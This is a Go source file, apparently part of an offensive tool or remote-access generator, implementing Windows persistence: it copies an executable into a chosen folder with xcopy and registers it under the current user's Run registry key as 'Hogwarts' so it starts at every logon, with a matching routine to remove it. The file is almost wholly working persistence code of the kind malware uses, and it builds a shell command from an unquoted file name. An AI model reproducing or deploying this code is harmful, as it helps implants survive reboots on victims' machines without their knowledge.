package persistence

import (
	"github.com/phil-fly/generate/utils/cmd"
	"golang.org/x/sys/windows/registry"
	"log"
	"os"
)

type name interface {
}

type Persistence struct {
	folderPath string
	filename   string
}

func (self *Persistence) SetfolderPath(folderPath, folderExt string) {
	self.folderPath = folderPath + folderExt
}

func (self *Persistence) Setfilename(filename string) {
	self.filename = filename
}

func (self *Persistence) Enable() error {
	os.MkdirAll(self.folderPath, 0777)
	// Copy file to install path
	_, err := cmd.RunInWindows("xcopy /Y " + self.filename + " " + self.folderPath)
	if err != nil {
		return err
	}
	k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.ALL_ACCESS)

	if err != nil {
		return err
	}
	defer k.Close()
	err = k.SetStringValue("Hogwarts", "\""+self.folderPath+"\\"+self.filename+"\"")
	if err != nil {
		return err
	}

	// Check if file is created
	file := self.folderPath + "\\" + self.filename
	_, err = os.Stat(file)
	if err == nil {
		log.Print("[*] Persistence Enabled!")
	} else if os.IsNotExist(err) {
		log.Print("[*] Persistence Failed!")
	}
	return nil
}

func (self *Persistence) Disable() error {
	os.RemoveAll(self.folderPath)

	k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.ALL_ACCESS)

	if err != nil {
		return err
	}
	defer k.Close()
	err = k.DeleteValue("Hogwarts")
	if err != nil {
		return err
	}
	return nil
}

func CreateFile(path string, text string) {
	create, _ := os.Create(path)
	create.WriteString(text)
	create.Close()
}
